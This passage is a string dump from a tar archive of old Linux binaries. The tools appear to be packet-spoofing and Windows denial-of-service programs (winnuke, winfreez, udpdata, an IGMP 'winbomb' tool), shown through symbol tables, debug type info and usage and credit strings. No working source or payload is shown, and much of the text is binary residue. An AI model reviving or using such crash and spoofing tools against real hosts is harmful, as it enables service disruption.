            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "trash2.c",
            "send_igmp",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "resolve",
            "getpwuid@@GLIBC_2.0",
            "random@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "inet_aton@@GLIBC_2.0",
            "_start",
            "banner",
            "uname@@GLIBC_2.0",
            "sendwin98bug",
            "randip",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "send_winbomb",
            "data_start",
            "printf@@GLIBC_2.0",
            "getuid@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "calloc@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "_IO_stdin_used",
            "sprintf@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/udpdata",
            "0100755",
            "0000000",
            "0000000",
            "00000032503",
            "07100656730",
            "013507",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "putchar",
            "printf",
            "perror",
            "socket",
            "fprintf",
            "__deregister_frame_info",
            "setsockopt",
            "sendto",
            "bcopy",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRh",
            "U@WVE",
            "fE\u0703E",
            "fEEl",
            "EP }",
            "j&EPEPL u",
            "e^_]",
            "\u0403;u[]",
            "1234567890",
            "usage: %s sourcename sourceport destinationname destinationport",
            "can't resolve source hostname",
            "can't resolve destination hostname",
            "socket",
            "we have IP_HDRINCL :-)",
            "setsockopt IP_HDRINCL",
            "sendto",
            "datagram sent without error:",
            "%02x",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "udpdata.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "putchar@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "_start",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/winfreez",
            "0100755",
            "0000000",
            "0000000",
            "00000036640",
            "07100656732",
            "013726",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "strcpy",
            "printf",
            "atol",
            "malloc",
            "socket",
            "bzero",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "setsockopt",
            "rand",
            "sendto",
            "bcopy",
            "srand",
            "time",
            "gethostbyname",
            "sprintf",
            "stderr",
            "htons",
            "exit",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "free",
            "GLIBC_2.0",
            "1^PTRh",
            "QVh@",
            "REPf",
            "}#h ",
            " }#h7",
            "EPh\u03d1",
            "EPh\u0711",
            "EPEPEPEP%",
            "UEPy",
            "jdlP",
            ".L\u06c5L",
            "\u067dJfJf",
            "fH\u066dH\u06ddLL\u066dJP",
            "UL\u06c5L",
            "\u067dJfJf",
            "fH\u066dH\u06ddLL\u066dJP",
            "UzL\u06c5L",
            "\u067dJfJf",
            "fH\u066dH\u06ddLL\u066dJP",
            "U L\u06c5L",
            "\u067dJfJf",
            "fH\u066dH\u06ddLL\u066dJP",
            "EPEPEPEPh\"",
            "EPy EP",
            "Tf\u01c5P",
            "jPdP",
            "jdlPE",
            "P }#h.",
            ";Eu\t",
            "E1fE",
            "fE1fu",
            "e[^]",
            "\u0403;u[]",
            "usage: %s sendto sendfrom time",
            "socket creation error",
            "sockopt IP_HDRINCL error",
            "winfreez by Delmore, <delmore@moscowmail.com>",
            "Soldiers Of Satan group, http://sos.nanko.ru",
            "sendto = %s",
            "sendfrom = %s",
            "time = %i s",
            "%s: unknown sendto",
            "%s: unknown sendfrom",
            "%u.%u.%u.%u",
            "sendto error",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "winfreez.c",
            "atol@@GLIBC_2.0",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "_fp_hw",
            "fprintf@@GLIBC_2.0",
            "attack",
            "bcopy@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "time@@GLIBC_2.0",
            "_start",
            "strlen@@GLIBC_2.0",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "srand@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "sprintf@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "__gmon_start__",
            "strcpy@@GLIBC_2.0",
            "datapool/bin/winnuke",
            "0100755",
            "0000000",
            "0000000",
            "00000031710",
            "07100656734",
            "013550",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "connect",
            "perror",
            "socket",
            "bzero",
            "send",
            "inet_addr",
            "__deregister_frame_info",
            "bcopy",
            "gethostbyname",
            "htons",
            "exit",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh",
            "QVh\u0207",
            "E1fE",
            "t$EP",
            "u&h,",
            "\u0403;u[]",
            "gethostbyname()",
            "connect()",
            "Connected to [%s:%d].",
            "Usage: %s <target>",
            "socket()",
            "Sending crash... ",
            "Done!",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
